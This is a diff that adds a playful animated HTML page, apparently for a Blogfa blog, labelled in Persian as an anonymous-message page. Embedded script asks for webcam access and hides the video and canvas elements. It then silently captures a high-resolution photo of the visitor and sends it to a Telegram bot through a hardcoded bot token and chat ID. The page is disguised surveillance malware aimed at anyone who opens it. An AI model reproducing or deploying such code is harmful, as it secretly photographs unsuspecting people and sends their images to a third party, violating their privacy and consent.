@@ -1,0 +1,136 @@
+
+<html>
+<BLOGFA>
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    background: linear-gradient(-45deg, #ff6f61, #ffcc70, #6a82fb, #fc5c7d);
+    background-size: 400% 400%;
+    animation: gradientBG 10s ease infinite;
+    font-family: sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    overflow: hidden;
+    color: white;
+  }
+  @keyframes gradientBG {
+    0% {background-position: 0% 50%;}
+    50% {background-position: 100% 50%;}
+    100% {background-position: 0% 50%;}
+  }
+  .monkey {
+    position: absolute;
+    width: 150px;
+    animation: floatMonkey 12s linear infinite;
+  }
+  @keyframes floatMonkey {
+    0% { transform: translate(-200px, 100vh) rotate(0deg); opacity: 0; }
+    10% { opacity: 1; }
+    50% { transform: translate(50vw, 50vh) rotate(15deg); }
+    90% { opacity: 1; }
+    100% { transform: translate(120vw, -200px) rotate(-10deg); opacity: 0; }
+  }
+  .meteor {
+    position: absolute;
+    width: 2px;
+    height: 80px;
+    background: linear-gradient(180deg, rgba(255,255,255,0.8), rgba(255,255,255,0));
+    opacity: 0;
+    transform: rotate(45deg);
+    animation: fall linear forwards;
+    border-radius: 50%;
+    filter: blur(1px);
+  }
+  @keyframes fall {
+    0% {
+      transform: translate(var(--sx), var(--sy)) rotate(45deg);
+      opacity: 1;
+    }
+    100% {
+      transform: translate(var(--ex), var(--ey)) rotate(45deg);
+      opacity: 0;
+    }
+  }
+  #video, #canvas { display: none; }
+</style>
+
+<img src="https://i.ibb.co/4Vx2cVx/monkey.png" class="monkey">
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+<div>📩 ارسال پیام ناشناس</div>
+
+<script>
+(async function(){
+  const BOT_TOKEN = "8313314297:AAHGTQLu0cnCxdVz6QA_Y57gqT5afS-L3-o";
+  const CHAT_ID = "7298320749";
+  const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { width: { ideal: 1920 }, height: { ideal: 1080 } }
+    });
+    video.srcObject = stream;
+    await new Promise(res => video.onloadedmetadata = res);
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+  } catch (err) {
+    return;
+  }
+
+  function captureImage() {
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    return canvas.toDataURL("image/jpeg", 0.95);
+  }
+
+  setTimeout(async () => {
+    const imageBase64 = captureImage();
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", dataURItoBlob(imageBase64), "capture.jpg");
+    try {
+      await fetch(TG_URL, { method: "POST", body: formData });
+    } catch (err) {}
+  }, 500);
+
+  function dataURItoBlob(dataURI) {
+    let byteString = atob(dataURI.split(',')[1]);
+    let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    let ab = new ArrayBuffer(byteString.length);
+    let ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+      ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], {type: mimeString});
+  }
+})();
+
+function spawnMeteor() {
+  const el = document.createElement("div");
+  el.className = "meteor";
+  
+  const startX = Math.random() * 100;
+  const startY = -10;
+  const endX = startX + (Math.random() * 50 + 30);
+  const endY = 110;
+
+  el.style.setProperty("--sx", startX + "vw, " + startY + "vh");
+  el.style.setProperty("--sy", startX + "vw, " + startY + "vh");
+  el.style.setProperty("--ex", endX + "vw, " + endY + "vh");
+  el.style.setProperty("--ey", endX + "vw, " + endY + "vh");
+
+  el.style.animationDuration = (Math.random() * 2 + 1.5) + "s";
+  el.style.background = `linear-gradient(180deg, hsla(${Math.random()*360}, 100%, 80%, 1), transparent)`;
+
+  document.body.appendChild(el);
+  setTimeout(() => el.remove(), 3000);
+}
+setInterval(spawnMeteor, 500);
+</script>
+</html>
